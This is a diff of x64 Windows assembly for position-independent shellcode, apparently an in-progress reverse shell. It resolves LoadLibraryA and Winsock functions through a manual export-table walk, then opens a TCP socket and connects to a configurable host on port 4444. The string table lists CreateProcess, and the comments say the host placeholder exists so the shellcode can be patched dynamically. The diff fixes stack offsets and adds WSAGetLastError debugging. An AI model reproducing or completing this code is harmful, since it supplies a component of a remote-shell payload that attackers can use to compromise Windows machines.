@@ -7,29 +7,26 @@
 ;note: ExitProcess is forwarded
 main proc
 
-    sub rsp, 28h                    ;reserve stack space for called functions
-    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned   B
- 
+    sub rsp, 28h            ;reserve stack space for called functions
+    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned 
+	
     lea rdx, loadlib_func
     lea rcx, kernel32_dll
     call lookup_api         ;get address of LoadLibraryA
     mov r15, rax            ;save for later use with forwarded exports
-
+	
     call startup
     cmp rax, 0h             ; check result
     jne exit                ; failed
     
     call socket             ; setup socket
     cmp rax, -1h            ; check result 
-    je  cleanup             ; failed INVALID_SOCKET
-    
-    mov r14d, eax           ; save socket fd in r14
-    
+    je 	cleanup             ; failed INVALID_SOCKET
+	
     call connect            ; connect socket
     cmp rax, 0h             ; check result
-    jne cleanup             ; failed
-    
-
+	jne checkerr            ; failed
+	
 cleanup:
     
     lea rcx, ws2_32_dll
@@ -52,29 +49,46 @@ exit:
     
     add rsp, 28h
     ret
+	
+	
+checkerr:
+	
+	lea rcx, ws2_32_dll
+    call r15                ;load ws2_32.dll
+
+	lea rdx, wsa_getlasterr_func
+    lea rcx, ws2_32_dll
+    call lookup_api         ; get address of WSAGetLastError
+    
+	int 3
+    call rax                ; WSAGetLastError
+	
+	jmp cleanup
 
 main endp
 
 startup proc
 
-    push rbp
+	push rbp
     mov rbp, rsp
 
-    sub rsp, 1c0h                   ; allocate space (local 198h for WSADATA + 28h shadow space)
-    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned   
-
-    lea rcx, ws2_32_dll
+	sub rsp, 1c0h                   ; allocate space (local 198h for WSADATA + 20h shadow space)
+	and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned 
+	
+	
+	lea rcx, ws2_32_dll
     call r15                ;load ws2_32.dll
-
+	
     lea rdx, wsa_startup_func
     lea rcx, ws2_32_dll
     call lookup_api         ; get address of WSAStartup
 
-    lea rdx, [rbp-30h]      ; lpWSAData skip shadow & return addr
+	
+    lea rdx, [rbp-30h]      	; lpWSAData skip shadow & return addr
     mov rcx, 2d             ; wVersionRequired
     call rax                ; WSAStartup
     
-    add rsp, 1c0h           ; deallocate stack space
+	add rsp, 1c0h           ; deallocate stack space
 
     leave
     ret
@@ -87,9 +101,9 @@ socket proc
     mov rbp, rsp
     
     ; allocate space
-    sub rsp, 30h                   ; allocate space (28h shadow + GROUP 4h + dwFlags 4h)
-    and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned   
-    
+    sub rsp, 30h            ; allocate space (20h shadow + GROUP 4h + dwFlags 4h + padding 8h)
+    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned 
+	
     lea rcx, ws2_32_dll
     call r15                ;load ws2_32.dll
         
@@ -98,16 +112,16 @@ socket proc
     call lookup_api         ; get address of WSASocketA
         
     xor rbx, rbx
-    mov [rbp-28h], rbx       ; dwFlags
-    mov [rbp-2ch], rbx       ; group 
+    mov [rsp+24h], rbx       ; dwFlags
+    mov [rsp+20h], rbx       ; group 
     
     mov r9, 0h              ; lpProtocolInfo
     mov r8, 6h              ; protocol
     mov rdx, 1h             ; type
     mov rcx, 2h             ; af
-    
+	
     call rax                ; WSASocket
-        
+		
     add rsp, 30h           ; deallocate stack space
     
     leave
@@ -121,8 +135,10 @@ connect proc
     mov rbp, rsp
     
     ; allocate space
-    sub rsp, 3eh                   ; allocate space (28h shadow + sockaddr 16h)
-    and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned   
+    sub rsp, 3ah                   ; allocate space (20h shadow + sockaddr 10h + socketfd 4h + 6h padding)
+    and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned
+	
+	mov [rbp-12h], eax				; save socket fd
     
     lea rcx, ws2_32_dll
     call r15                ;load ws2_32.dll
@@ -130,29 +146,24 @@ connect proc
     lea rdx, wsa_connect_func
     lea rcx, ws2_32_dll
     call lookup_api         ; get address of WSAConnect
-        
+        	
     xor r8, r8
     add r8w, 2h
-    mov [rbp-16h], r8w      ; family type
+    mov [rbp-0ch], r8w       ; family type
             
     mov r8w, [port]         ; port
-    mov [rbp-14h], r8w
+    mov [rbp-0ah], r8w
     
     mov r8d, [host_addr]    ; host addr
-    mov [rbp-10h], r8d
+    mov [rbp-8h], r8d
+	
+	mov r8, 10h             ; namelen 16 bytes
+    lea rdx, [rbp-0ch]      ; sockaddr
+    mov ecx, [rbp-12h]      ; socket fd
+	
+    call rax                ; connect
     
-    xor r8, r8
-    mov [rbp-8h], r8d ; zeroes
-    
-    lea rdx, [rbp-16h]      ; sockaddr
-        
-    xor r9, r9              ; lpCallerData
-    mov r8, 10h             ; namelen 16 bytes
-    mov ecx, r14d           ; socket
-    
-    call rax                ; WSAConnect
-    
-    add rsp, 3eh           ; deallocate stack space
+    add rsp, 3ah           ; deallocate stack space
     
     leave
     ret
@@ -168,14 +179,17 @@ loadlib_func        db  'LoadLibraryA', 0
 wsa_startup_func    db  'WSAStartup', 0
 wsa_cleanup_func    db  'WSACleanup', 0
 wsa_socketa_func    db  'WSASocketA', 0
-wsa_connect_func    db  'WSAConnect', 0
+wsa_connect_func    db  'connect', 0
+wsa_getlasterr_func	db	'WSAGetLastError', 0
 create_process_func db  'CreateProcess', 0
 exitproc_func       db  'ExitProcess', 0
 ;exitthread_func    db  'ExitThread', 0
 
 ; initialized
-host_addr           dd  0h        ; placeholder that can be changed dynamically in shellcode
-port                dw  5c11h            ; 4444d
+
+;host_addr           dd  ffffffffh      ; 255.255.255.255 placeholder so shellcode can be dynamically changed
+host_addr           dd  0100007fh      ; 127.0.0.1
+port                dw  5c11h          ; 4444d
 
  
 ;look up address of function from DLL export table
